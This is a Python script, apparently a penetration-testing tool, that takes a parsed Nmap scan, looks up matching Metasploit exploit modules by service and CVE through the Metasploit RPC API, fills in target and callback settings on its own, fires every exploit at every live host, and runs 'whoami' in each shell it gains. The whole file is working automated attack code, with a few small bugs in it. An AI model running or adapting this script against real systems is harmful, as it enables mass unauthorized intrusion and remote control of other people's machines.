from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PayloadModule
from parse_scan import parse_from_JSON
from sys import argv
from socket import socket
from pprint import pprint

NOT_TESTED = 'NOT_TESTED'
NO_SHELL = 'NO_SHELL'
ACQUIRED_SHELL = 'ACQUIRED_SHELL'
FAILED = 'FAILED'

class ExploitManager:
    def __init__(self, server_ip: str, password: str, port: int):
        """Instantiates an object of the MetasploitManager class.""" 
        self.server_ip = server_ip
        self.parsed_scan = None
        self.modules = None
        self.manager = MsfRpcClient(password, ip=server_ip, port=port)

    def load_scan(self, parsed_scan: dict):
        """Loads a new Nmap scan to be analyzed.""" 
        self.parsed_scan = parsed_scan 
        self.modules = {}
    
    def load_options(self, options: dict):
        """Loads modules to be used to exploit each port.""" 
        self.modules = options

    def analyze_scan(self) -> dict:
        """Find useful modules from Metasploit manager based on CVE in parsed_scan 
        and fill the missing required option using the information stored in parsed_scan
        
        Returns:
            (dict): Modules found and their respective settings.
        """
        for ip, scan in self.parsed_scan.items():
            if scan["state"] != "up":
                continue
            for port, info in scan["ports"].items():
                if info.get("service"):
                    self.add_module(ip, port, info.get("service"))
                cve_set = info.get("vulner", [])
                for cve in cve_set:
                    self.add_module(ip, port, cve)
        return self.modules

    def add_module(self, ip: str, port: str, vulnerability: str) -> dict:
        """Gets a metasploit module given the target IP, port and a
        vulnerability.
    
        Args:
            ip (str): The IP address of the target machine.
            port(int): The port of the target machine.
            vulnerability (str): The vulnerability to be searched.
        
        Returns:
            (dict): Module found and its settings.
        """
        exploit_list = self.manager.modules.search(vulnerability)            
        for exploit in exploit_list:
            exploit_name = exploit.get("fullname")
            if exploit and exploit_name and exploit.get("type") == "exploit":
                exploit = self.manager.modules.use("exploit", exploit_name)

                #Initializes all nested dictionaries for that specific vulnerability if they don't already exist.
                self.modules[ip] = self.modules.get(ip, {})
                self.modules[ip][port] = self.modules[ip].get(port, {})
                self.modules[ip][port][vulnerability] = self.modules[ip][port].get(vulnerability, {})
                self.modules[ip][port][vulnerability]["exploit"] = exploit_name
                self.modules[ip][port][vulnerability]["status"] = NOT_TESTED

                payloads = exploit.targetpayloads()
                if payloads:
                    self.modules[ip][port][vulnerability]["payload"] = payloads[0]

                payload = manager.manager.modules.use('payload', 'cmd/unix/interact')

                self.save_options(ip, port, vulnerability, exploit)
                self.save_options(ip, port, vulnerability, payload)
                
                return self.modules[ip][port][vulnerability]

    def save_options(self, ip: str, port: str, vulnerability: str, module: ExploitModule | PayloadModule):
        """Sets and saves the options for the exploit or payload module on
        the modules attribute.
    
        Args:
            ip (str): The IP address of the target machine.
            port (int): The port of the target machine.
            vulnerability (str): The vulnerability to be searched.
            module (ExploitModule | PayloadModule): The module to be used
        
        Returns:
            (dict): Module found and its settings.
        """
        option_type = 'exploit_options' if type(module) is ExploitModule else 'payload_options'
        self.modules[ip][port][vulnerability][option_type] = self.modules[ip][port][vulnerability].get(option_type, {})
        for option in module.options:
            if option in module.missing_required or option in ["CHOST", "CPORT", "RPORT"]:
                setting = self.fill_option(option, ip, port)
                if setting:
                    self.modules[ip][port][vulnerability][option_type][option] = self.fill_option(option, ip, port)
                else:
                    print(f"Option {option} in module {module.fullname} not configured.")
            elif module[option]:
                    self.modules[ip][port][vulnerability][option_type][option] = module[option]

    def fill_option(self, option_name:str, target_ip:str, target_port: str) -> str | int:
        """Choses which passed value to return based on the option name"""
        option = option_name.upper()
        if "RHOST" in option:
            return target_ip
        elif option in ["SRVHOST", "CHOST", "LHOST"]:
            return self.server_ip
        elif option in ["CPORT", "LPORT"]:
            free_sock = socket()
            free_sock.bind(('', 0))
            return free_sock.getsockname()[1]
        elif "RPORT" in option:
            return target_port
        else:
            return None

    def exploit(self, ip: str, port: int, vulnerability: str) -> dict:
        """Exploits the target given its IP, port and a vulnerability.
    
        Args:
            ip (str): The IP address of the target machine.
            port(int): The port of the target machine.
            vulnerability (str): The code of the vulnerability to be exploited.
        
        Returns:   
            (dict): Information about the exploit job.
        """
        try:
            vuln_info = self.modules[ip][port][vulnerability]
        except KeyError:
            print(f"Vulnerability {vulnerability} of {ip}:{port} not saved.")
            return {}
        num_shells = len(self.manager.sessions.list)
        exploit = self.manager.modules.use("exploit", vuln_info["exploit"])
        for option_name, setting in vuln_info["exploit_options"].items():
            if setting:
                try:
                    exploit[option_name] = setting
                except KeyError:
                    print(f'Option {option_name} in module {module_name} not valid.')
        payload_name = vuln_info.get("payload")
        if payload_name:
            payload = self.manager.modules.use("payload", payload_name)
            for option_name, setting in vuln_info["payload_options"].items():
                if setting:
                    try:
                        payload[option_name] = setting
                    except KeyError:
                        print(f'Option {option_name} in module {payload_name} not valid.')
            result = exploit.execute(payload=payload)
        else:
            result = exploit.execute()
        if len(self.manager.sessions.list) > num_shells:
            self.modules[ip][port][vulnerability]["status"] = ACQUIRED_SHELL
        elif result.get('job_id') is None:
            self.modules[ip][port][vulnerability]["status"] = FAILED
        else:
            self.modules[ip][port][vulnerability]["status"] = NO_SHELL
        return result

    def exploit_all(self) -> list:
        """Uses all vulnerabilities on self.modules to exploit all their
        respective targets.

        Returns:
            (list): Result from all exploit jobs
        """
        results = []
        for ip, scan in self.modules.items():
            for port, port_scan in scan.items():
                for vulnerability in port_scan:
                    result = self.exploit(ip, port, vulnerability)
                    results.append(result)
        return results

if __name__ == "__main__":
    if len(argv) < 5:
        print("Usage: py exploit.py [scan_file] [server_ip] [msf_password] [msf_port]")
        print("\te.g. py exploit.py seed/10.1.0.1.json 10.10.0.13 NEl5ln9A 55552")
        exit(1)
    parsed_scan = parse_from_JSON(argv[1])
    manager = ExploitManager(argv[2], argv[3], argv[4])
    manager.load_scan(parsed_scan) 
    manager.analyze_scan()
    print('\nExploit Results')
    pprint(manager.exploit_all())
    print('\nModules Used:')
    pprint(manager.modules)
    print('\nSessions Acquired:')
    pprint(manager.manager.sessions.list)
    for session in manager.manager.sessions.list.keys():
        shell = manager.manager.sessions.session(session)
        shell.write('whoami')
        print(shell.read())
